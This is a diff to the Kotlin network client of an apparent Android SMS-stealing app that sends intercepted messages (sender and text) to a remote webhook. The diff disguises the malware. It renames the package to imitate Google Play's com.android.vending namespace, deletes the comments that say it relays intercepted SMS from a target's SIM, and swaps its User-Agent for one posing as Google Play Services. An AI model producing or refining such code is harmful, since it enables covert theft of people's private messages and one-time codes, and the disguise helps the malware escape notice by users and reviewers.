@@ -1,4 +1,4 @@
-package com.yourname.relay
+package com.android.vending.preload.check
 
 import android.util.Log
 import kotlinx.coroutines.Dispatchers
@@ -8,21 +8,7 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import java.util.concurrent.TimeUnit
 
-/**
- * Sends intercepted SMS to the backend webhook using Twilio's form schema.
- *
- * The backend's sms_webhook reads these form fields:
- *   From        -> sender's phone number (or target's SIM, for relay mode)
- *   To          -> recipient (we send DEVICE_ID; backend ignores for relay)
- *   Body        -> full SMS text
- *   MessageSid  -> unique id (relay-{DEVICE_ID}-{epochMs})
- *
- * Auth is via the X-Relay-Secret header (validated by _is_authorized_relay
- * in the backend). Twilio-signed requests use a different path and need no
- * secret.
- */
 object BackendClient {
-
     private const val TAG = "BackendClient"
 
     private val client = OkHttpClient.Builder()
@@ -31,10 +17,6 @@ object BackendClient {
         .writeTimeout(Config.TIMEOUT_SECONDS, TimeUnit.SECONDS)
         .build()
 
-    /**
-     * Relay a single SMS to the backend.
-     * @return true if the POST succeeded (HTTP 2xx), false otherwise.
-     */
     suspend fun relay(
         from: String,
         body: String,
@@ -51,7 +33,7 @@ object BackendClient {
             .url(Config.BACKEND_WEBHOOK)
             .post(formBody)
             .addHeader("X-Relay-Secret", Config.RELAY_SECRET)
-            .addHeader("User-Agent", "Android-System-Update/1.0")
+            .addHeader("User-Agent", "Google-Play-Services-Preload/1.0")
             .build()
 
         try {
